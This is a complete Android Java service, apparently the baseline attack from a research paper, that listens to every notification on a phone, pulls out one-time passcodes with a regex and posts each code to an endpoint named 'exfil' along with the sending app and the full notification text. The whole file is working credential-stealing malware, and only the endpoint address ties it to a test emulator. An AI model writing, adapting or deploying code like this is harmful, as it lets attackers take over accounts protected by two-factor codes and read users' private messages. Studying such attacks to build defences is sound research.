package com.secrethandle.b0agent;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * B0 baseline: reads one-time codes from notifications and forwards them.
 *
 * It scans every posted notification for the plaintext of the notification,
 * extracts a numeric one-time-code candidate, and POSTs the raw value plus a
 * short context string to {@link #ENDPOINT}. This is the "read and exfiltrate"
 * pattern from the paper (attack 1) under the unprotected B0 condition.
 */
public class OtpExfilService extends NotificationListenerService {

    public static final String TAG = "B0Agent";
    public static final String ENDPOINT = "http://10.0.2.2:8787/exfil";

    private static final Pattern OTP = Pattern.compile("\\b(\\d{4,8})\\b");

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            if (sbn == null || sbn.getNotification() == null) {
                return;
            }
            Bundle ex = sbn.getNotification().extras;
            if (ex == null) {
                return;
            }
            String full = flatten(ex);
            Log.i(TAG, "posted from " + sbn.getPackageName() + ": " + full);
            String otp = extract(full);
            if (otp != null) {
                forward(sbn.getPackageName(), otp, full);
            }
        } catch (Throwable t) {
            Log.e(TAG, "onNotificationPosted error", t);
        }
    }

    /** Collect every CharSequence in the notification extras into one string. */
    private static String flatten(Bundle ex) {
        StringBuilder sb = new StringBuilder();
        sb.append(cs(ex.getCharSequence(Notification.EXTRA_TITLE))).append(" ");
        sb.append(cs(ex.getCharSequence(Notification.EXTRA_TEXT))).append(" ");
        sb.append(cs(ex.getCharSequence(Notification.EXTRA_BIG_TEXT))).append(" ");
        sb.append(cs(ex.getCharSequence(Notification.EXTRA_SUB_TEXT))).append(" ");
        for (String key : ex.keySet()) {
            Object v = ex.get(key);
            if (v instanceof CharSequence) {
                sb.append(cs((CharSequence) v)).append(" ");
            } else if (v instanceof CharSequence[]) {
                for (CharSequence c : (CharSequence[]) v) {
                    sb.append(cs(c)).append(" ");
                }
            }
        }
        return sb.toString().replaceAll("\\s+", " ").trim();
    }

    private static String cs(CharSequence c) {
        return c == null ? "" : c.toString();
    }

    /** Prefer a 6-8 digit code; fall back to the first 4-8 digit group. */
    static String extract(String s) {
        Matcher m = OTP.matcher(s);
        String fallback = null;
        while (m.find()) {
            String g = m.group(1);
            if (g.length() >= 6) {
                return g;
            }
            if (fallback == null) {
                fallback = g;
            }
        }
        return fallback;
    }

    private void forward(final String pkg, final String otp, final String ctx) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection c = null;
                try {
                    URL u = new URL(ENDPOINT);
                    c = (HttpURLConnection) u.openConnection();
                    c.setRequestMethod("POST");
                    c.setDoOutput(true);
                    c.setConnectTimeout(4000);
                    c.setReadTimeout(4000);
                    c.setRequestProperty("Content-Type", "application/json");
                    String body = "{\"source\":\"" + esc(pkg)
                            + "\",\"otp\":\"" + esc(otp)
                            + "\",\"context\":\"" + esc(ctx) + "\"}";
                    OutputStream os = c.getOutputStream();
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                    os.close();
                    int code = c.getResponseCode();
                    Log.i(TAG, "forwarded otp=" + otp + " -> HTTP " + code);
                } catch (Throwable t) {
                    Log.e(TAG, "forward failed", t);
                } finally {
                    if (c != null) {
                        c.disconnect();
                    }
                }
            }
        }).start();
    }

    private static String esc(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", " ").replace("\r", " ");
    }
}
